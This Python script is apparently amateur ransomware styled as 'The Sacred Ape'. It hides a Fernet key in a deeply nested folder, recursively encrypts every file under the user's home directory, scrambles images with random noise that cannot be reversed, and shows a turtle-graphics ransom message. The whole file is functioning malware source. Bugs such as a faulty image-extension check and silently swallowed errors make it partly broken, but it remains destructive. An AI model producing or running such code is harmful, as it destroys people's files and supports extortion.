from decimal import DivisionByZero
from cryptography.fernet import Fernet
import imageio.v2 as imageio
import os, re, numpy
import random
import turtle

KEY_LOCATION = "\\metadata"
for _ in range(70):
    KEY_LOCATION += "\\k"

def encrypt_users(path):
    try:
        for files in os.listdir(path):
            if os.path.isdir(path + "\\" + files):
                encrypt_users(path + "\\" + files)
            else:
                if re.findall(".png|.jpg|.jpeg|.jpe|.jif|.jfif|.jfi|.gif|.tiff|.tif|.webp|.psd|.raw|.arw|.cr2|.nrw|.k25|.svg|.svgz|.bmp|.dib|.heif|.heic", path):
                    encrypt_image(path)
                else:
                    encrypt_file(path + "\\" + files) 
    except:
        pass

def encrypt_file(path):
    with open((os.path.expanduser("~") + KEY_LOCATION + "\\key.txt"), "rb") as file:
        key = file.read()
    fernet = Fernet(key)
    try:
        with open(path) as file:
            original = bytes(file.read(), "utf-8")
        encrypted = fernet.encrypt(original)
        with open(path, "wb") as file:
            file.write(encrypted)
    except:
        pass

def decrypt_file(path):
    with open((os.path.expanduser("~") + KEY_LOCATION + "\\key.txt"), "rb") as file:
        key = file.read()
    fernet = Fernet(key)
    try:
        with open(path) as file:
            encrypted = file.read()
        original = fernet.decrypt(encrypted)
        with open(path, "w") as file:
            file.write(original.decode())
    except:
        pass

def encrypt_image(path):
    try: 
        with imageio.imopen(path, "r") as file:
            original = file.read()
            array = numpy.copy(original)
            for i in range(len(array)):
                for j in range(len(array[i])):
                    for k in range(len(array[i][j])):
                        array[i][j][k] += random.randint(0, 255)
            imageio.imwrite(path, array)
    except: 
        pass #does nothing if it fails

def generate_key():
    os.mkdir((os.path.expanduser("~") + "\\metadata"))

    key = Fernet.generate_key()
    extension = "\\metadata"
    for _ in range(70):
        extension += "\\k"
        os.mkdir((os.path.expanduser("~") + extension))
    with open((os.path.expanduser("~") + extension + "\\key.txt"), "wb") as file:
        file.write(key)

def generate_ransome_message():
    t = turtle.Turtle()
    s = turtle.Screen()
    s.addshape("sacred_ape.gif")
    t.shape("sacred_ape.gif")

    turtle.penup()
    turtle.goto(-350, -250)
    turtle.pendown()
    turtle.write("The Sacred Ape has \n captured your files.", font=("Arial", 60, "normal"))
    turtle.penup()
    s.exitonclick();

def main():
    #print(os.listdir(os.path.expanduser("~")))
    generate_key()
    encrypt_users(os.path.expanduser("~"))
    generate_ransome_message()
    #decrypt_file("tiger.png")

if __name__ == "__main__":
    main()